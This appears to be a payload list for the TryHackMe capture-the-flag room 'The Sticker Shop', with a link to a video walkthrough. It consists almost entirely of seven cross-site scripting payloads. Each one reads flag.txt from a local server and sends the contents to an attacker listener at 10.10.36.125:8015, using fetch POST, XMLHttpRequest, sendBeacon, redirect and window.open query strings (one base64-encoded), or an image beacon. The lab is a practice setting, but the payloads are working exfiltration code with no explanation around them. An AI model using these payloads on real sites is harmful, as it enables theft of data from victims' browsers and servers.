Payload used on TryHackMe room The Sticker Shop https://tryhackme.com/r/room/thestickershop
video walk through: https://youtu.be/lB68TvzPEHI

<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.36.125:8015', { 
      method: 'POST',
      body: data
    });
  });
</script>

==
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://127.0.0.1:8080/flag.txt', true);
xhr.onload = function() {
    fetch('http://10.10.36.125:8015', {
        method: 'POST',
        body: xhr.responseText
    });
};
xhr.send();
</script>

==

<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    navigator.sendBeacon('http://10.10.36.125:8015', data);
  });
</script>

===

<script>
(async () => {
  try {
    const response = await fetch('http://127.0.0.1:8080/flag.txt');
    const data = await response.text();
    await fetch('http://10.10.36.125:8015', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: data
    });
  } catch (error) {
    // Optional error handling
  }
})();
</script>

== get
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    window.location = `http://10.10.36.125:8015?flag=${encodeURIComponent(data)}`;
  });
</script>


base64:

<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    window.open(`http://10.10.36.125:8015?flag=${btoa(data)}`, '_blank');
  });
</script>

===
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    var img = new Image();
    img.src = `http://10.10.36.125:8015/?flag=${encodeURIComponent(data)}`;
  });
</script>

===
